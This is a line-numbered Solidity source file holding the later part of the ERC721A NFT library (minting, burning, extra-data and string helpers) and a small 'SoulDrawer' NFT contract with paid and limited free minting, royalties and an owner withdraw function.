1052             _packedOwnerships[startTokenId] = _packOwnershipData(
1053                 to,
1054                 _nextInitializedFlag(quantity) | _nextExtraData(address(0), to, 0)
1055             );
1056 
1057             uint256 toMasked;
1058             uint256 end = startTokenId + quantity;
1059 
1060             // Use assembly to loop and emit the `Transfer` event for gas savings.
1061             // The duplicated `log4` removes an extra check and reduces stack juggling.
1062             // The assembly, together with the surrounding Solidity code, have been
1063             // delicately arranged to nudge the compiler into producing optimized opcodes.
1064             assembly {
1065                 // Mask `to` to the lower 160 bits, in case the upper bits somehow aren't clean.
1066                 toMasked := and(to, _BITMASK_ADDRESS)
1067                 // Emit the `Transfer` event.
1068                 log4(
1069                     0, // Start of data (0, since no data).
1070                     0, // End of data (0, since no data).
1071                     _TRANSFER_EVENT_SIGNATURE, // Signature.
1072                     0, // `address(0)`.
1073                     toMasked, // `to`.
1074                     startTokenId // `tokenId`.
1075                 )
1076 
1077                 // The `iszero(eq(,))` check ensures that large values of `quantity`
1078                 // that overflows uint256 will make the loop run out of gas.
1079                 // The compiler will optimize the `iszero` away for performance.
1080                 for {
1081                     let tokenId := add(startTokenId, 1)
1082                 } iszero(eq(tokenId, end)) {
1083                     tokenId := add(tokenId, 1)
1084                 } {
1085                     // Emit the `Transfer` event. Similar to above.
1086                     log4(0, 0, _TRANSFER_EVENT_SIGNATURE, 0, toMasked, tokenId)
1087                 }
1088             }
1089             if (toMasked == 0) revert MintToZeroAddress();
1090 
1091             _currentIndex = end;
1092         }
1093         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1094     }
1095 
1096     /**
1097      * @dev Mints `quantity` tokens and transfers them to `to`.
1098      *
1099      * This function is intended for efficient minting only during contract creation.
1100      *
1101      * It emits only one {ConsecutiveTransfer} as defined in
1102      * [ERC2309](https://eips.ethereum.org/EIPS/eip-2309),
1103      * instead of a sequence of {Transfer} event(s).
1104      *
1105      * Calling this function outside of contract creation WILL make your contract
1106      * non-compliant with the ERC721 standard.
1107      * For full ERC721 compliance, substituting ERC721 {Transfer} event(s) with the ERC2309
1108      * {ConsecutiveTransfer} event is only permissible during contract creation.
1109      *
1110      * Requirements:
1111      *
1112      * - `to` cannot be the zero address.
1113      * - `quantity` must be greater than 0.
1114      *
1115      * Emits a {ConsecutiveTransfer} event.
1116      */
1117     function _mintERC2309(address to, uint256 quantity) internal virtual {
1118         uint256 startTokenId = _currentIndex;
1119         if (to == address(0)) revert MintToZeroAddress();
1120         if (quantity == 0) revert MintZeroQuantity();
1121         if (quantity > _MAX_MINT_ERC2309_QUANTITY_LIMIT) revert MintERC2309QuantityExceedsLimit();
1122 
1123         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1124 
1125         // Overflows are unrealistic due to the above check for `quantity` to be below the limit.
1126         unchecked {
1127             // Updates:
1128             // - `balance += quantity`.
1129             // - `numberMinted += quantity`.
1130             //
1131             // We can directly add to the `balance` and `numberMinted`.
1132             _packedAddressData[to] += quantity * ((1 << _BITPOS_NUMBER_MINTED) | 1);
1133 
1134             // Updates:
1135             // - `address` to the owner.
1136             // - `startTimestamp` to the timestamp of minting.
1137             // - `burned` to `false`.
1138             // - `nextInitialized` to `quantity == 1`.
1139             _packedOwnerships[startTokenId] = _packOwnershipData(
1140                 to,
1141                 _nextInitializedFlag(quantity) | _nextExtraData(address(0), to, 0)
1142             );
1143 
1144             emit ConsecutiveTransfer(startTokenId, startTokenId + quantity - 1, address(0), to);
1145 
1146             _currentIndex = startTokenId + quantity;
1147         }
1148         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1149     }
1150 
1151     /**
1152      * @dev Safely mints `quantity` tokens and transfers them to `to`.
1153      *
1154      * Requirements:
1155      *
1156      * - If `to` refers to a smart contract, it must implement
1157      * {IERC721Receiver-onERC721Received}, which is called for each safe transfer.
1158      * - `quantity` must be greater than 0.
1159      *
1160      * See {_mint}.
1161      *
1162      * Emits a {Transfer} event for each mint.
1163      */
1164     function _safeMint(
1165         address to,
1166         uint256 quantity,
1167         bytes memory _data
1168     ) internal virtual {
1169         _mint(to, quantity);
1170 
1171         unchecked {
1172             if (to.code.length != 0) {
1173                 uint256 end = _currentIndex;
1174                 uint256 index = end - quantity;
1175                 do {
1176                     if (!_checkContractOnERC721Received(address(0), to, index++, _data)) {
1177                         revert TransferToNonERC721ReceiverImplementer();
1178                     }
1179                 } while (index < end);
1180                 // Reentrancy protection.
1181                 if (_currentIndex != end) revert();
1182             }
1183         }
1184     }
1185 
1186     /**
1187      * @dev Equivalent to `_safeMint(to, quantity, '')`.
1188      */
1189     function _safeMint(address to, uint256 quantity) internal virtual {
1190         _safeMint(to, quantity, '');
1191     }
1192 
1193     // =============================================================
1194     //                        BURN OPERATIONS
1195     // =============================================================
1196 
1197     /**
1198      * @dev Equivalent to `_burn(tokenId, false)`.
1199      */
1200     function _burn(uint256 tokenId) internal virtual {
1201         _burn(tokenId, false);
1202     }
1203 
1204     /**
1205      * @dev Destroys `tokenId`.
1206      * The approval is cleared when the token is burned.
1207      *
1208      * Requirements:
1209      *
1210      * - `tokenId` must exist.
1211      *
1212      * Emits a {Transfer} event.
1213      */
1214     function _burn(uint256 tokenId, bool approvalCheck) internal virtual {
1215         uint256 prevOwnershipPacked = _packedOwnershipOf(tokenId);
1216 
1217         address from = address(uint160(prevOwnershipPacked));
1218 
1219         (uint256 approvedAddressSlot, address approvedAddress) = _getApprovedSlotAndAddress(tokenId);
1220 
1221         if (approvalCheck) {
1222             // The nested ifs save around 20+ gas over a compound boolean condition.
1223             if (!_isSenderApprovedOrOwner(approvedAddress, from, _msgSenderERC721A()))
1224                 if (!isApprovedForAll(from, _msgSenderERC721A())) revert TransferCallerNotOwnerNorApproved();
1225         }
1226 
1227         _beforeTokenTransfers(from, address(0), tokenId, 1);
1228 
1229         // Clear approvals from the previous owner.
1230         assembly {
1231             if approvedAddress {
1232                 // This is equivalent to `delete _tokenApprovals[tokenId]`.
1233                 sstore(approvedAddressSlot, 0)
1234             }
1235         }
1236 
1237         // Underflow of the sender's balance is impossible because we check for
1238         // ownership above and the recipient's balance can't realistically overflow.
1239         // Counter overflow is incredibly unrealistic as `tokenId` would have to be 2**256.
1240         unchecked {
1241             // Updates:
1242             // - `balance -= 1`.
1243             // - `numberBurned += 1`.
1244             //
1245             // We can directly decrement the balance, and increment the number burned.
1246             // This is equivalent to `packed -= 1; packed += 1 << _BITPOS_NUMBER_BURNED;`.
1247             _packedAddressData[from] += (1 << _BITPOS_NUMBER_BURNED) - 1;
1248 
1249             // Updates:
1250             // - `address` to the last owner.
1251             // - `startTimestamp` to the timestamp of burning.
1252             // - `burned` to `true`.
1253             // - `nextInitialized` to `true`.
1254             _packedOwnerships[tokenId] = _packOwnershipData(
1255                 from,
1256                 (_BITMASK_BURNED | _BITMASK_NEXT_INITIALIZED) | _nextExtraData(from, address(0), prevOwnershipPacked)
1257             );
1258 
1259             // If the next slot may not have been initialized (i.e. `nextInitialized == false`) .
1260             if (prevOwnershipPacked & _BITMASK_NEXT_INITIALIZED == 0) {
1261                 uint256 nextTokenId = tokenId + 1;
1262                 // If the next slot's address is zero and not burned (i.e. packed value is zero).
1263                 if (_packedOwnerships[nextTokenId] == 0) {
1264                     // If the next slot is within bounds.
1265                     if (nextTokenId != _currentIndex) {
1266                         // Initialize the next slot to maintain correctness for `ownerOf(tokenId + 1)`.
1267                         _packedOwnerships[nextTokenId] = prevOwnershipPacked;
1268                     }
1269                 }
1270             }
1271         }
1272 
1273         emit Transfer(from, address(0), tokenId);
1274         _afterTokenTransfers(from, address(0), tokenId, 1);
1275 
1276         // Overflow not possible, as _burnCounter cannot be exceed _currentIndex times.
1277         unchecked {
1278             _burnCounter++;
1279         }
1280     }
1281 
1282     // =============================================================
1283     //                     EXTRA DATA OPERATIONS
1284     // =============================================================
1285 
1286     /**
1287      * @dev Directly sets the extra data for the ownership data `index`.
1288      */
1289     function _setExtraDataAt(uint256 index, uint24 extraData) internal virtual {
1290         uint256 packed = _packedOwnerships[index];
1291         if (packed == 0) revert OwnershipNotInitializedForExtraData();
1292         uint256 extraDataCasted;
1293         // Cast `extraData` with assembly to avoid redundant masking.
1294         assembly {
1295             extraDataCasted := extraData
1296         }
1297         packed = (packed & _BITMASK_EXTRA_DATA_COMPLEMENT) | (extraDataCasted << _BITPOS_EXTRA_DATA);
1298         _packedOwnerships[index] = packed;
1299     }
1300 
1301     /**
1302      * @dev Called during each token transfer to set the 24bit `extraData` field.
1303      * Intended to be overridden by the cosumer contract.
1304      *
1305      * `previousExtraData` - the value of `extraData` before transfer.
1306      *
1307      * Calling conditions:
1308      *
1309      * - When `from` and `to` are both non-zero, `from`'s `tokenId` will be
1310      * transferred to `to`.
1311      * - When `from` is zero, `tokenId` will be minted for `to`.
1312      * - When `to` is zero, `tokenId` will be burned by `from`.
1313      * - `from` and `to` are never both zero.
1314      */
1315     function _extraData(
1316         address from,
1317         address to,
1318         uint24 previousExtraData
1319     ) internal view virtual returns (uint24) {}
1320 
1321     /**
1322      * @dev Returns the next extra data for the packed ownership data.
1323      * The returned result is shifted into position.
1324      */
1325     function _nextExtraData(
1326         address from,
1327         address to,
1328         uint256 prevOwnershipPacked
1329     ) private view returns (uint256) {
1330         uint24 extraData = uint24(prevOwnershipPacked >> _BITPOS_EXTRA_DATA);
1331         return uint256(_extraData(from, to, extraData)) << _BITPOS_EXTRA_DATA;
1332     }
1333 
1334     // =============================================================
1335     //                       OTHER OPERATIONS
1336     // =============================================================
1337 
1338     /**
1339      * @dev Returns the message sender (defaults to `msg.sender`).
1340      *
1341      * If you are writing GSN compatible contracts, you need to override this function.
1342      */
1343     function _msgSenderERC721A() internal view virtual returns (address) {
1344         return msg.sender;
1345     }
1346 
1347     /**
1348      * @dev Converts a uint256 to its ASCII string decimal representation.
1349      */
1350     function _toString(uint256 value) internal pure virtual returns (string memory str) {
1351         assembly {
1352             // The maximum value of a uint256 contains 78 digits (1 byte per digit), but
1353             // we allocate 0xa0 bytes to keep the free memory pointer 32-byte word aligned.
1354             // We will need 1 word for the trailing zeros padding, 1 word for the length,
1355             // and 3 words for a maximum of 78 digits. Total: 5 * 0x20 = 0xa0.
1356             let m := add(mload(0x40), 0xa0)
1357             // Update the free memory pointer to allocate.
1358             mstore(0x40, m)
1359             // Assign the `str` to the end.
1360             str := sub(m, 0x20)
1361             // Zeroize the slot after the string.
1362             mstore(str, 0)
1363 
1364             // Cache the end of the memory to calculate the length later.
1365             let end := str
1366 
1367             // We write the string from rightmost digit to leftmost digit.
1368             // The following is essentially a do-while loop that also handles the zero case.
1369             // prettier-ignore
1370             for { let temp := value } 1 {} {
1371                 str := sub(str, 1)
1372                 // Write the character to the pointer.
1373                 // The ASCII index of the '0' character is 48.
1374                 mstore8(str, add(48, mod(temp, 10)))
1375                 // Keep dividing `temp` until zero.
1376                 temp := div(temp, 10)
1377                 // prettier-ignore
1378                 if iszero(temp) { break }
1379             }
1380 
1381             let length := sub(end, str)
1382             // Move the pointer 32 bytes leftwards to make room for the length.
1383             str := sub(str, 0x20)
1384             // Store the length.
1385             mstore(str, length)
1386         }
1387     }
1388 }
1389 
1390 contract SoulDrawer is ERC721A {
1391     address public owner;
1392 
1393     uint256 public maxSupply = 1000;
1394 
1395     uint256 public price;
1396 
1397     mapping(address => uint256) private _userForFree;
1398 
1399     mapping(uint256 => uint256) private _userMinted;
1400 
1401     function mint(uint256 amount) compliance(amount) payable public {
1402         require(totalSupply() + amount <= maxSupply);
1403         _safeMint(msg.sender, amount);
1404     }
1405 
1406     modifier compliance(uint256 amount) {
1407         require(tx.origin == msg.sender);
1408         if (msg.value == 0) {
1409             require(amount == 1);
1410             if (totalSupply() > maxSupply / 3) {
1411                 require(_userMinted[block.number] < FreeNum() 
1412                     && _userForFree[tx.origin] < 1 );
1413                 _userForFree[tx.origin]++;
1414                 _userMinted[block.number]++;
1415             }
1416         } else {
1417             require(msg.value >= amount * price);
1418         }
1419         _;
1420     }
1421 
1422     function reserve(address addr, uint256 amount) public onlyOwner {
1423         require(totalSupply() + amount <= maxSupply);
1424         _safeMint(addr, amount);
1425     }
1426     
1427     modifier onlyOwner {
1428         require(owner == msg.sender);
1429         _;
1430     }
1431 
1432     string uri;
1433     function setUri(string memory _uri) external onlyOwner {
1434         uri = _uri;
1435     }
1436 
1437     constructor() ERC721A("Soul Drawer", "SD") {
1438         owner = msg.sender;
1439         price = 0.0025 ether;
1440         uri = "ipfs://QmQvmSRHMPNRng1doXKpUKr7emrFJGq3qBCSQbc2G6d1cn/";
1441     }
1442 
1443     function tokenURI(uint256 tokenId) public view override returns (string memory) {
1444         return string(abi.encodePacked(uri, _toString(tokenId), ".json"));
1445     }
1446 
1447     function FreeNum() internal returns (uint256){
1448         return (maxSupply - totalSupply()) / 12;
1449     }
1450 
1451     function royaltyInfo(uint256 _tokenId, uint256 _salePrice) public view virtual returns (address, uint256) {
1452         uint256 royaltyAmount = (_salePrice * 69) / 1000;
1453         return (owner, royaltyAmount);
1454     }
1455 
1456     function withdraw() external onlyOwner {
1457         payable(msg.sender).transfer(address(this).balance);
1458     }
1459 }